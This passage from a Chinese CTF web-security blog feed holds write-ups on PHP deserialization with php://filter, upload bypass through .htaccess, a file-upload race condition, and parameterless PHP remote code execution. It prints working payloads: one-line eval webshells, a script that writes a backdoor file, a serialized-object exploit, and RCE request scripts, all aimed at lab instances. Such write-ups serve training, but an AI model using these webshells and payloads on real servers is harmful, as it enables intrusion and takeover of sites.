class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261854257.png" alt="image-20220626185443186"></p><blockquote><p>注意：用hacbar传值的话会失败，直接用bp传参</p></blockquote><h2 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h2><ol><li>md5的数组绕过</li><li>哈希碰撞绕过</li><li>弱类型绕过</li><li>利用二进制md5数据构造SQL注入</li></ol><hr><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="题目环境：-1"><a href="#题目环境：-1" class="headerlink" title="题目环境："></a>题目环境：</h2><pre class="line-numbers language-none"><code class="language-none"> &lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  &#x2F;&#x2F;useless.php        $password &#x3D; unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h3><p>使用hacbar中的工具构造：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">?text=data://text/plain;base64,[d2VsY29tZSB0byB0aGUgempjdGY=]&amp;file=php://filter/convert.base64-encode/resource=useless.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262024300.png" alt="image-20220626202403253"></p><p>得到：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload2：-1"><a href="#payload2：-1" class="headerlink" title="payload2："></a>payload2：</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token comment">#$file = "flag.php"; </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="finally-payload："><a href="#finally-payload：" class="headerlink" title="finally  payload："></a>finally  payload：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">?text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token operator">//</span>text<span class="token operator">/</span>plain<span class="token punctuation">;</span>base64<span class="token punctuation">,</span><span class="token punctuation">[</span>d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token builtin">file</span><span class="token operator">=</span>useless<span class="token punctuation">.</span>php<span class="token operator">&amp;</span>password<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><h2 id="题目环境：-2"><a href="#题目环境：-2" class="headerlink" title="题目环境："></a>题目环境：</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262049834.png" alt="image-20220626204934677"></p><h2 id="解题步骤：-1"><a href="#解题步骤：-1" class="headerlink" title="解题步骤："></a>解题步骤：</h2><blockquote><p>只要上传文件名为 .php* .phtml* 都会被拦截</p><blockquote><blockquote><p>思路：</p></blockquote></blockquote></blockquote><blockquote><blockquote><p>利用.htaccess文件，将上传的png图片解析为php文件即可</p></blockquote></blockquote><p>传一个.htaccess文件， 其实现功能为：当前目录下所有 名称为<code>shell</code>的文件都以 php 进行解析</p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a><em>.htaccess</em></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>FilesMatch <span class="token string double-quoted-string">"shell"</span><span class="token operator">></span>SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>.htaccess文件还可以写成这样：(表示所有jpg文件以php进行解析)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262137492.png" alt="image-20220626213740464"></p><h3 id="知识："><a href="#知识：" class="headerlink" title="知识："></a>知识：</h3><h4 id="htaccess是什么？"><a href="#htaccess是什么？" class="headerlink" title=".htaccess是什么？"></a>.htaccess是什么？</h4><blockquote><p>.<a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>文件(或者”<a href="https://so.csdn.net/so/search?q=%E5%88%86%E5%B8%83%E5%BC%8F&spm=1001.2101.3001.7020">分布式</a>配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过<a href="http://www.lvjiyong.com/tag/apache/">Apache</a>的AllowOverride指令来设置。</p></blockquote><blockquote><p>概述来说，<a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>文件是<a href="http://www.lvjiyong.com/tag/apache/">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过<a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><h4 id="使用-htaccess文件的场合"><a href="#使用-htaccess文件的场合" class="headerlink" title="使用.htaccess文件的场合"></a><strong>使用.htaccess文件的场合</strong></h4><blockquote><p>.htaccess文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有root权限的情况下</p></blockquote><h3 id="传图片马"><a href="#传图片马" class="headerlink" title="传图片马"></a>传图片马</h3><p>传一个图片类型的一句话木马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件后缀改为.png</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262053092.png" alt="image-20220626205333050"></p><p>but</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262053622.png" alt="image-20220626205349577"></p><blockquote><p>我快吐啦，真的不能理解这个url的拼接规则，我一直以为是我的一句话木马有语法错误，裂开。。</p></blockquote><blockquote><blockquote><p>不过总算连接上啦！！</p></blockquote></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//e3ff68d4-0f56-45f5-90d6-fe659e678462.node4.buuoj.cn:81/upload/fce558920a313421cb1c89269f2e320d/shell</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271201548.png" alt="image-20220627120107482"></p><p>得到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271229566.png" alt="image-20220627122940514"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>文件上传&amp;条件竞争</title>
    <link href="https://kannikanyun.github.io/2022/06/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <id>https://kannikanyun.github.io/2022/06/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</id>
    <published>2022-06-24T14:02:38.000Z</published>
    <updated>2022-06-25T11:44:40.146Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://blog.csdn.net/mmzkyl/article/details/112318210">条件竞争之文件上传</a></p><h1 id="一-什么是条件竞争上传"><a href="#一-什么是条件竞争上传" class="headerlink" title="一.什么是条件竞争上传"></a>一.什么是条件竞争上传</h1><p>条件竞争上传是一种服务器端的漏洞，由于后端程序操作逻辑不合理导致。<br>由于服务器端在处理不同用户的请求时是<u><em>并发</em></u>进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生，此漏洞一般发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p><h2 id="upload-labs（Pass-17）"><a href="#upload-labs（Pass-17）" class="headerlink" title="upload-labs（Pass-17）"></a>upload-labs（Pass-17）</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="源码解释："><a href="#源码解释：" class="headerlink" title="源码解释："></a>源码解释：</h3><p>这里应该是我们成功上传了php文件但后端在*<u>短时间内将其删除</u>*了，所以我们要抢到<u><em>在它删除之前访问文件</em></u>，就如我们打开文件的时候去删除它，会提示文件文件已打开一样，这样从而防止文件被删除</p><h3 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h3><p>利用该逻辑漏洞先行<u><em>上传</em></u>一个后门文件,同时我们再去<u><em>访问该后门文件</em></u>;</p><p>令其在同级目录下重新写入一个后门脚本,这丫也能够的话即使原有的后门脚本被删除,我们也可以利用这个被写入的新的后门去得到访问权限。</p><h3 id="后门脚本"><a href="#后门脚本" class="headerlink" title="后门脚本"></a>后门脚本</h3><p>现在我们就制作这样一个可写入的后门脚本。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$string</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["test"]); ?>'</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fcolse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该脚本的意思就是在我们访问这个文件的时候,就生成一个 “shell_test.php” 文件,同时在文件内写入 “<?php @eval($_POST[test]);?></p><p>因为从上传到删除的整个过程会非常的短,所以我们需要利用 Burp 的<br>requests 模块制造两个场景。一个是不停的上传最初的脚本文件,一个需要不停的去访问这个最初的脚本文件去触发它写入新的脚本的动作。</p><p>Python脚本访问：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">"https://www.baidu.com"</span>    <span class="token keyword">if</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yse,访问成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>无参rce</title>
    <link href="https://kannikanyun.github.io/2022/06/24/%E6%97%A0%E5%8F%82rce/"/>
    <id>https://kannikanyun.github.io/2022/06/24/%E6%97%A0%E5%8F%82rce/</id>
    <published>2022-06-24T10:49:11.000Z</published>
    <updated>2022-06-24T13:58:12.841Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://blog.csdn.net/weixin_46706771/article/details/119008895">RCE总结</a></p><h2 id="概念介绍："><a href="#概念介绍：" class="headerlink" title="概念介绍："></a>概念介绍：</h2><blockquote><p>RCE英文全称：remote command/code execute<br>分为远程命令执行ping和远程代码执行evel。</p><blockquote><p>漏洞出现的原因：没有在输入口做输入处理。<br>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上</p><blockquote><p>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p></blockquote></blockquote></blockquote><p><u>所谓无参数RCE，就是通过<strong>没有参数的函数达到命令执行的目的</strong></u></p><p>即</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span> <span class="token punctuation">(</span> 搜索的模式<span class="token punctuation">,</span>用于替换的字符串或字符串数组<span class="token punctuation">,</span>要搜索替换的 <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">无参rce详细解释</a></p><p>常用方法：</p><h2 id="1-getenv"><a href="#1-getenv" class="headerlink" title="1.getenv()"></a>1.getenv()</h2><p>获取一个环境变量值</p><blockquote><p><code>$GLOBALS</code><br><code>$_SERVER $_GET</code><br><code>$_POST $_FILES</code><br><code>$_COOKIE $_SESSION</code><br><code>$_REQUEST $_ENV</code></p></blockquote><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><blockquote><p>array_rand(array_flip($a))</p><ol><li>array_rand():随机从数组中返回键</li><li>array_flip():交换数组中键和值</li></ol></blockquote><h2 id="2-getallheaders"><a href="#2-getallheaders" class="headerlink" title="2.getallheaders()"></a>2.getallheaders()</h2><p><em><u>getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效</u></em></p><p>可以进一步利用http header的sky属性进行rce</p><blockquote><blockquote><p>var_dump(getallheaders()); //直接页面回显</p></blockquote><blockquote><p>sky: phpinfo();</p></blockquote></blockquote><blockquote><p>sky：system(‘ls /tmp’);</p><p>或：</p><p>sky：phpinfo();</p></blockquote><h2 id="3-get-defined-vars"><a href="#3-get-defined-vars" class="headerlink" title="3.get_defined_vars()"></a>3.get_defined_vars()</h2><p>如果目标中间件不为apache，可以使用get_defined_vars()，显全局变量<code>_GET $_POST $_FILES $_COOKIE</code></p><p>get_defined_vars():<code>返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量</code></p><p>payload：</p><p><code>code=var_dump(current(get_defined_vars()));&amp;sky=phpinfo();</code></p><p>如果网站对一下进行全局过滤</p><pre class="line-numbers language-none"><code class="language-none">$_GET$_POST$_COOKIE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最终脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOpayload <span class="token operator">=</span> <span class="token string">"system('ls /tmp');"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  payload<span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'sky cool!'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-session-id"><a href="#4-session-id" class="headerlink" title="4.session_id()"></a>4.session_id()</h1><p>则，hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;localhost&#x2F;?code&#x3D;eval(hex2bin(session_id(session_start())));&#39;payload &#x3D; &quot;echo &#39;sky cool&#39;;&quot;.encode(&#39;hex&#39;)cookies &#x3D; &#123;&#39;PHPSESSID&#39;:payload&#125;r &#x3D; requests.get(url&#x3D;url,cookies&#x3D;cookies)print r.content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="5-dirname-amp-chdir"><a href="#5-dirname-amp-chdir" class="headerlink" title="5.dirname() &amp; chdir()"></a>5.dirname() &amp; chdir()</h1><h3 id="poyload"><a href="#poyload" class="headerlink" title="poyload:"></a>poyload:</h3><pre class="line-numbers language-none"><code class="language-none">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));<span aria-hidden="true" 